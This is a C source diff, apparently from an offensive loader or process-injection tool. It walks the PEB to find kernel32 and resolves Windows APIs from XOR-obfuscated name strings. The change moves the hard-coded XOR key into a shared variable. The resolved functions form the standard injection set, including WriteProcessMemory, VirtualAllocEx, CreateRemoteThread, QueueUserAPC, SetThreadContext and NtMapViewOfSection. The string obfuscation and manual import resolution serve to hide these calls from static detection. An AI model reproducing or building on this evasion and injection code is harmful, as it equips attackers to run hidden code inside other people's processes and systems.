@@ -402,8 +402,6 @@ LONG RVAToOffset(DWORD rva, IMAGE_SECTION_HEADER *SectionHeaders, WORD SectionHe
 
 HMODULE MyGetKernelModuleHandle(void)
 {
-    char *key = "00000";
-
 #ifdef _M_X64
     PEB *pPeb = (PEB *)__readgsqword(0x60);
 #else
@@ -414,7 +412,7 @@ HMODULE MyGetKernelModuleHandle(void)
     LIST_ENTRY *CurrentListEntry = FirstListEntry->Flink;
 
     char cKernelDLL[] = {0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c, 0};
-    MyXor(cKernelDLL, 12, key, 5);
+    MyXor(cKernelDLL, 12, key, key_len);
 
     while (CurrentListEntry != FirstListEntry)
     {
@@ -510,146 +508,144 @@ LPVOID MyGetProcAddressByOrdinal(ULONG_PTR ulModuleAddr, WORD wOrdinal)
 
 void PopulateKernelFunctionPtrsByName(LPVOID lpvKernelDLL)
 {
-    char *key = "00000";
-
     char cOpenFile[] = {0x7f, 0x40, 0x55, 0x5e, 0x76, 0x59, 0x5c, 0x55, 0};
-    MyXor((BYTE *)cOpenFile, 8, (BYTE *)key, 5);
+    MyXor(cOpenFile, 8, key, key_len);
     pOpenFile = MyGetProcAddressByName((BYTE *)lpvKernelDLL, cOpenFile);
 
     char cLoadLibraryA[] = {0x7c, 0x5f, 0x51, 0x54, 0x7c, 0x59, 0x52, 0x42, 0x51, 0x42, 0x49, 0x71, 0};
-    MyXor(cLoadLibraryA, 12, key, 5);
+    MyXor(cLoadLibraryA, 12, key, key_len);
     pLoadLibraryA = MyGetProcAddressByName(lpvKernelDLL, cLoadLibraryA);
 
     char cGetFileSize[] = {0x77, 0x55, 0x44, 0x76, 0x59, 0x5c, 0x55, 0x63, 0x59, 0x4a, 0x55, 0};
-    MyXor(cGetFileSize, 11, key, 5);
+    MyXor(cGetFileSize, 11, key, key_len);
     pGetFileSize = MyGetProcAddressByName(lpvKernelDLL, cGetFileSize);
 
     char cCreateToolhelpSnapshot32[] = {0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x64, 0x5f, 0x5f, 0x5c, 0x58, 0x55, 0x5c, 0x40, 0x3, 0x2, 0x63, 0x5e, 0x51, 0x40, 0x43, 0x58, 0x5f, 0x44, 0};
-    MyXor(cCreateToolhelpSnapshot32, 24, key, 5);
+    MyXor(cCreateToolhelpSnapshot32, 24, key, key_len);
     pCreateToolhelp32Snapshot = MyGetProcAddressByName(lpvKernelDLL, cCreateToolhelpSnapshot32);
 
     char cProcess32First[] = {0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x3, 0x2, 0x76, 0x59, 0x42, 0x43, 0x44, 0};
-    MyXor(cProcess32First, 14, key, 5);
+    MyXor(cProcess32First, 14, key, key_len);
     pProcess32First = MyGetProcAddressByName(lpvKernelDLL, cProcess32First);
 
     char cProcess32Next[] = {0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x3, 0x2, 0x7e, 0x55, 0x48, 0x44, 0};
-    MyXor(cProcess32Next, 13, key, 5);
+    MyXor(cProcess32Next, 13, key, key_len);
     pProcess32Next = MyGetProcAddressByName(lpvKernelDLL, cProcess32Next);
 
     char cThread32First[] = {0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0x3, 0x2, 0x76, 0x59, 0x42, 0x43, 0x44, 0};
-    MyXor(cThread32First, 13, key, 5);
+    MyXor(cThread32First, 13, key, key_len);
     pThread32First = MyGetProcAddressByName(lpvKernelDLL, cThread32First);
 
     char cThread32Next[] = {0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0x3, 0x2, 0x7e, 0x55, 0x48, 0x44, 0};
-    MyXor(cThread32Next, 12, key, 5);
+    MyXor(cThread32Next, 12, key, key_len);
     pThread32Next = MyGetProcAddressByName(lpvKernelDLL, cThread32Next);
 
     char cGetModuleHandleA[] = {0x77, 0x55, 0x44, 0x7d, 0x5f, 0x54, 0x45, 0x5c, 0x55, 0x78, 0x51, 0x5e, 0x54, 0x5c, 0x55, 0x71, 0};
-    MyXor(cGetModuleHandleA, 16, key, 5);
+    MyXor(cGetModuleHandleA, 16, key, key_len);
     pGetModuleHandleA = MyGetProcAddressByName(lpvKernelDLL, cGetModuleHandleA);
 
     char cGetCurrentProcess[] = {0x77, 0x55, 0x44, 0x73, 0x45, 0x42, 0x42, 0x55, 0x5e, 0x44, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0};
-    MyXor(cGetCurrentProcess, 17, key, 5);
+    MyXor(cGetCurrentProcess, 17, key, key_len);
     pGetCurrentProcess = MyGetProcAddressByName(lpvKernelDLL, cGetCurrentProcess);
 
     char cCreateProcess[] = {0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x71, 0};
-    MyXor(cCreateProcess, 14, key, 5);
+    MyXor(cCreateProcess, 14, key, key_len);
     pCreateProcessA = MyGetProcAddressByName(lpvKernelDLL, cCreateProcess);
 
     char cOpenProcess[] = {0x7f, 0x40, 0x55, 0x5e, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0};
-    MyXor(cOpenProcess, 11, key, 5);
+    MyXor(cOpenProcess, 11, key, key_len);
     pOpenProcess = MyGetProcAddressByName(lpvKernelDLL, cOpenProcess);
 
     char cOpenThread[] = {0x7f, 0x40, 0x55, 0x5e, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
-    MyXor(cOpenThread, 10, key, 5);
+    MyXor(cOpenThread, 10, key, key_len);
     pOpenThread = MyGetProcAddressByName(lpvKernelDLL, cOpenThread);
 
     char cVirtualAlloc[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0};
-    MyXor(cVirtualAlloc, 12, key, 5);
+    MyXor(cVirtualAlloc, 12, key, key_len);
     pVirtualAlloc = MyGetProcAddressByName(lpvKernelDLL, cVirtualAlloc);
 
     char cVirtualAllocEx[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0x75, 0x48, 0};
-    MyXor(cVirtualAllocEx, 14, key, 5);
+    MyXor(cVirtualAllocEx, 14, key, key_len);
     pVirtualAllocEx = MyGetProcAddressByName(lpvKernelDLL, cVirtualAllocEx);
 
     char cReadProcessMemory[] = {0x62, 0x55, 0x51, 0x54, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x7d, 0x55, 0x5d, 0x5f, 0x42, 0x49, 0x0};
-    MyXor(cReadProcessMemory, 17, key, 5);
+    MyXor(cReadProcessMemory, 17, key, key_len);
     pReadProcessMemory = MyGetProcAddressByName(lpvKernelDLL, cReadProcessMemory);
 
     char cWriteProcessMemory[] = {0x67, 0x42, 0x59, 0x44, 0x55, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x7d, 0x55, 0x5d, 0x5f, 0x42, 0x49, 0};
-    MyXor(cWriteProcessMemory, 18, key, 5);
+    MyXor(cWriteProcessMemory, 18, key, key_len);
     pWriteProcessMemory = MyGetProcAddressByName(lpvKernelDLL, cWriteProcessMemory);
 
     char cReadFile[] = {0x62, 0x55, 0x51, 0x54, 0x76, 0x59, 0x5c, 0x55, 0};
-    MyXor(cReadFile, 8, key, 5);
+    MyXor(cReadFile, 8, key, key_len);
     pReadFile = MyGetProcAddressByName(lpvKernelDLL, cReadFile);
 
     char cVirtualProtect[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x60, 0x42, 0x5f, 0x44, 0x55, 0x53, 0x44, 0};
-    MyXor(cVirtualProtect, 14, key, 5);
+    MyXor(cVirtualProtect, 14, key, key_len);
     pVirtualProtect = MyGetProcAddressByName(lpvKernelDLL, cVirtualProtect);
 
     char cVirtualProtectEx[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x60, 0x42, 0x5f, 0x44, 0x55, 0x53, 0x44, 0x75, 0x48, 0};
-    MyXor(cVirtualProtectEx, 16, key, 5);
+    MyXor(cVirtualProtectEx, 16, key, key_len);
     pVirtualProtectEx = MyGetProcAddressByName(lpvKernelDLL, cVirtualProtectEx);
 
     char cCreateThread[] = {0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
-    MyXor(cCreateThread, 12, key, 5);
+    MyXor(cCreateThread, 12, key, key_len);
     pCreateThread = MyGetProcAddressByName(lpvKernelDLL, cCreateThread);
 
     char cCreateRemoteThread[] = {0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x62, 0x55, 0x5d, 0x5f, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
-    MyXor(cCreateRemoteThread, 18, key, 5);
+    MyXor(cCreateRemoteThread, 18, key, key_len);
     pCreateRemoteThread = MyGetProcAddressByName(lpvKernelDLL, cCreateRemoteThread);
 
     char cWaitForSingleObject[] = {0x67, 0x51, 0x59, 0x44, 0x76, 0x5f, 0x42, 0x63, 0x59, 0x5e, 0x57, 0x5c, 0x55, 0x7f, 0x52, 0x5a, 0x55, 0x53, 0x44, 0};
-    MyXor(cWaitForSingleObject, 19, key, 5);
+    MyXor(cWaitForSingleObject, 19, key, key_len);
     pWaitForSingleObject = MyGetProcAddressByName(lpvKernelDLL, cWaitForSingleObject);
 
     char cVirtualFree[] = {0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x76, 0x42, 0x55, 0x55, 0};
-    MyXor(cVirtualFree, 11, key, 5);
+    MyXor(cVirtualFree, 11, key, key_len);
     pVirtualFree = MyGetProcAddressByName(lpvKernelDLL, cVirtualFree);
 
     char cCloseHandle[] = {0x73, 0x5c, 0x5f, 0x43, 0x55, 0x78, 0x51, 0x5e, 0x54, 0x5c, 0x55, 0};
-    MyXor(cCloseHandle, 11, key, 5);
+    MyXor(cCloseHandle, 11, key, key_len);
     pCloseHandle = MyGetProcAddressByName(lpvKernelDLL, cCloseHandle);
 
     char cSuspendThread[] = {0x63, 0x45, 0x43, 0x40, 0x55, 0x5e, 0x54, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
-    MyXor(cSuspendThread, 13, key, 5);
+    MyXor(cSuspendThread, 13, key, key_len);
     pSuspendThread = MyGetProcAddressByName(lpvKernelDLL, cSuspendThread);
 
     char cResumeThread[] = {0x62, 0x55, 0x43, 0x45, 0x5d, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
-    MyXor(cResumeThread, 12, key, 5);
+    MyXor(cResumeThread, 12, key, key_len);
     pResumeThread = MyGetProcAddressByName(lpvKernelDLL, cResumeThread);
 
     char cSleep[] = {0x63, 0x5c, 0x55, 0x55, 0x40, 0x0};
-    MyXor(cSleep, 5, key, 5);
+    MyXor(cSleep, 5, key, key_len);
     pSleep = MyGetProcAddressByName(lpvKernelDLL, cSleep);
 
     char cGetThreadContext[] = {0x77, 0x55, 0x44, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0x73, 0x5f, 0x5e, 0x44, 0x55, 0x48, 0x44, 0};
-    MyXor(cGetThreadContext, 16, key, 5);
+    MyXor(cGetThreadContext, 16, key, key_len);
     pGetThreadContext = MyGetProcAddressByName(lpvKernelDLL, cGetThreadContext);
 
     char cSetThreadContext[] = {0x63, 0x55, 0x44, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0x73, 0x5f, 0x5e, 0x44, 0x55, 0x48, 0x44, 0};
-    MyXor(cSetThreadContext, 16, key, 5);
+    MyXor(cSetThreadContext, 16, key, key_len);
     pSetThreadContext = MyGetProcAddressByName(lpvKernelDLL, cSetThreadContext);
 
     char cQueueUserAPC[] = {0x61, 0x45, 0x55, 0x45, 0x55, 0x65, 0x43, 0x55, 0x42, 0x71, 0x60, 0x73, 0};
-    MyXor(cQueueUserAPC, 12, key, 5);
+    MyXor(cQueueUserAPC, 12, key, key_len);
     pQueueUserAPC = MyGetProcAddressByName(lpvKernelDLL, cQueueUserAPC);
 
     char cFreeLibrary[] = {0x76, 0x42, 0x55, 0x55, 0x7c, 0x59, 0x52, 0x42, 0x51, 0x42, 0x49, 0};
-    MyXor(cFreeLibrary, 11, key, 5);
+    MyXor(cFreeLibrary, 11, key, key_len);
     pFreeLibrary = MyGetProcAddressByName(lpvKernelDLL, cFreeLibrary);
 
     char cGetProcAddress[] = {0x77, 0x55, 0x44, 0x60, 0x42, 0x5f, 0x53, 0x71, 0x54, 0x54, 0x42, 0x55, 0x43, 0x43, 0};
-    MyXor(cGetProcAddress, 14, key, 5);
+    MyXor(cGetProcAddress, 14, key, key_len);
     pGetProcAddress = MyGetProcAddressByName(lpvKernelDLL, cGetProcAddress);
 
     char cCreateFileA[] = {0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x76, 0x59, 0x5c, 0x55, 0x71, 0};
-    MyXor(cCreateFileA, 11, key, 5);
+    MyXor(cCreateFileA, 11, key, key_len);
     pCreateFileA = MyGetProcAddressByName(lpvKernelDLL, cCreateFileA);
 
     char cWriteFile[] = {0x67, 0x42, 0x59, 0x44, 0x55, 0x76, 0x59, 0x5c, 0x55, 0x0};
-    MyXor(cWriteFile, 9, key, 5);
+    MyXor(cWriteFile, 9, key, key_len);
     pWriteFile = MyGetProcAddressByName(lpvKernelDLL, cWriteFile);
 }
 
@@ -743,30 +739,28 @@ void PopulateKernelFunctionPtrsByOrdinal(LPVOID lpvKernelDLL)
 
 void PopulateNTDLLFunctionPtrsByName(LPVOID lpvNTDLL)
 {
-    char *key = "00000";
-
     char cNtCreateThreadEx[] = {0x7e, 0x44, 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0x75, 0x48, 0};
-    MyXor(cNtCreateThreadEx, 16, key, 5);
+    MyXor(cNtCreateThreadEx, 16, key, key_len);
     pNTCreateThreadEx = MyGetProcAddressByName(lpvNTDLL, cNtCreateThreadEx);
 
     char cRTLCreateUserThread[] = {0x62, 0x44, 0x5c, 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x65, 0x43, 0x55, 0x42, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0};
-    MyXor(cRTLCreateUserThread, 19, key, 5);
+    MyXor(cRTLCreateUserThread, 19, key, key_len);
     pRTLCreateUserThread = MyGetProcAddressByName(lpvNTDLL, cRTLCreateUserThread);
 
     char cNTCreateSection[] = {0x7e, 0x44, 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x63, 0x55, 0x53, 0x44, 0x59, 0x5f, 0x5e, 0};
-    MyXor(cNTCreateSection, 15, key, 5);
+    MyXor(cNTCreateSection, 15, key, key_len);
     pNTCreateSection = MyGetProcAddressByName(lpvNTDLL, cNTCreateSection);
 
     char cNTMapViewOfSection[] = {0x7e, 0x44, 0x7d, 0x51, 0x40, 0x66, 0x59, 0x55, 0x47, 0x7f, 0x56, 0x63, 0x55, 0x53, 0x44, 0x59, 0x5f, 0x5e, 0};
-    MyXor(cNTMapViewOfSection, 18, key, 5);
+    MyXor(cNTMapViewOfSection, 18, key, key_len);
     pNTMapViewOfSection = MyGetProcAddressByName(lpvNTDLL, cNTMapViewOfSection);
 
     char cNtQueryInformationProcess[] = {0x7e, 0x44, 0x61, 0x45, 0x55, 0x42, 0x49, 0x79, 0x5e, 0x56, 0x5f, 0x42, 0x5d, 0x51, 0x44, 0x59, 0x5f, 0x5e, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0};
-    MyXor(cNtQueryInformationProcess, 25, key, 5);
+    MyXor(cNtQueryInformationProcess, 25, key, key_len);
     pNtQueryInformationProcess = MyGetProcAddressByName(lpvNTDLL, cNtQueryInformationProcess);
 
     char cNTFlushInstructionCache[] = {0x7e, 0x44, 0x76, 0x5c, 0x45, 0x43, 0x58, 0x79, 0x5e, 0x43, 0x44, 0x42, 0x45, 0x53, 0x44, 0x59, 0x5f, 0x5e, 0x73, 0x51, 0x53, 0x58, 0x55, 0};
-    MyXor(cNTFlushInstructionCache, 23, key, 5);
+    MyXor(cNTFlushInstructionCache, 23, key, key_len);
     pNTFlushInstructionCache = MyGetProcAddressByName(lpvNTDLL, cNTFlushInstructionCache);
 }
 
